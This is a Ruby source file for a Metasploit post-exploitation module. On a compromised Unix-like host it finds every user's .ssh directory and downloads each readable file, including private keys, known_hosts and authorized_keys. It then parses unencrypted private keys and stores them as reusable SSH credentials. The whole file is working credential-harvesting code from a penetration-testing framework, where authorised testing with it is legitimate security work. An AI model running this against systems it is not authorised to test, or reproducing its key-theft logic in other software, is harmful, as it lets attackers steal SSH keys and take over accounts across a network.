##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Gather OpenSSH PKI Credentials Collection',
        'Description' => %q{
          This module will collect the contents of all users' .ssh directories on the targeted
          machine. Additionally, known_hosts and authorized_keys and any other files are also
          downloaded. This module is largely based on firefox_creds.rb.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Jim Halfpenny',
          'g0tmi1k' # @g0tmi1k - additional features
        ],
        'Platform' => %w[bsd linux osx unix],
        'SessionTypes' => ['meterpreter', 'shell'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_ls
              stdapi_fs_separator
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def run
    print_status('Finding .ssh directories')
    paths = enum_user_directories.map { |d| d + '/.ssh' }
    # Array#select! is only in 1.9
    paths = paths.select { |d| directory?(d) }

    if paths.nil? || paths.empty?
      print_error('No users found with a .ssh directory')
      return
    end

    print_status("Looting #{paths.count} .ssh directories")
    download_loot(paths)
  end

  def download_loot(paths)
    paths.each do |path|
      path.chomp!

      print_status("Looting #{path} directory")

      unless executable?(path)
        print_warning("Cannot access directory: #{path} - Missing execute permission")
        next
      end

      begin
        if session.type == 'meterpreter'
          sep = session.fs.file.separator
          files = session.fs.dir.entries(path)
        else
          sep = '/'
          files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
        end
      rescue StandardError => e
        print_warning("Cannot access directory: #{path} - #{e.message}")
        next
      end

      user = File.basename(File.dirname(path))
      vprint_status("User: #{user}")
      files.each do |file|
        next if ['.', '..'].include?(file)

        file_path = "#{path}#{sep}#{file}"

        unless readable?(file_path)
          print_warning("Cannot read file: #{file_path} - Missing read permission")
          next
        end

        data = read_file(file_path)
        file = file.split(sep).last

        loot_path = store_loot("ssh.#{file.tr('.', '_')}", 'text/plain', session, data, "ssh_#{file}", "OpenSSH #{file} File")
        print_good("Downloaded: #{file_path} -> #{loot_path}")

        # store only ssh private keys
        store_ssh_key(data, user, file)
      end
    end
  end

  def store_ssh_key(data, user, filename)
    return unless data.to_s.include?('PRIVATE KEY')

    begin
      Net::SSH::KeyFactory.load_data_private_key(data, nil, false)

      create_credential(
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: refname,
        private_type: :ssh_key,
        private_data: data,
        username: user,
        workspace_id: myworkspace_id,
        address: session.session_host,
        port: 22,
        service_name: 'ssh',
        protocol: 'tcp'
      )

      print_good("Stored SSH private key (#{filename}) for user: #{user}")
    rescue Net::SSH::KeyFactory::KeyManagerError
      print_warning("SSH private key (#{filename}) is passphrase-protected - stored as loot but not parsed")
    rescue StandardError => e
      print_warning("Could not parse SSH private key in #{filename}: #{e.message}")
    end
  end
end
